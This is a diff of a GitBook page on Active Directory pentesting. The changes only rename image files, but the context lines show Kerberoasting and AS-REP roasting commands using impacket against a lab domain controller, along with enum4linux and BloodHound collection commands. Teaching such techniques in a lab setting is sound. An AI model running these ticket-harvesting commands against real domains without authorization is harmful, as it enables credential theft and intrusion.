@@ -99,7 +99,7 @@ Active directory is commonly used in banks and 95% of fortune 1000 companies and
 
 #### NTLM => NT LAN Manager Authentication
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>NTLM Auth Work</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>NTLM Auth Work</p></figcaption></figure>
 
 ### Kerberos Authentication
 
@@ -275,7 +275,7 @@ enum4linux -a -u "user" -p "password" <DC IP>
 impacket-GetUserSPNs hacktor.local/abdo:Sql@server -dc-ip 192.168.1.5 -request
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>if ServicePricipalname add</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>if ServicePricipalname add</p></figcaption></figure>
 
 ### GetNPUsers & Kerberos Pre-Auth - AS-REP Roasting
 
@@ -283,13 +283,13 @@ impacket-GetUserSPNs hacktor.local/abdo:Sql@server -dc-ip 192.168.1.5 -request
 impacket-GetNPUsers hacktor.local/abdo -dc-ip 192.168.1.5
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="danger" %}
 the attack don't work if  **"Don't Require Kerberos preauthentication**"
 {% endhint %}
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### bloodhound
 
@@ -297,7 +297,7 @@ the attack don't work if  **"Don't Require Kerberos preauthentication**"
 bloodhound-python -u user -p password -ns 192.168.1.5 -d hacktor.local -c All
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Silver Ticket
 
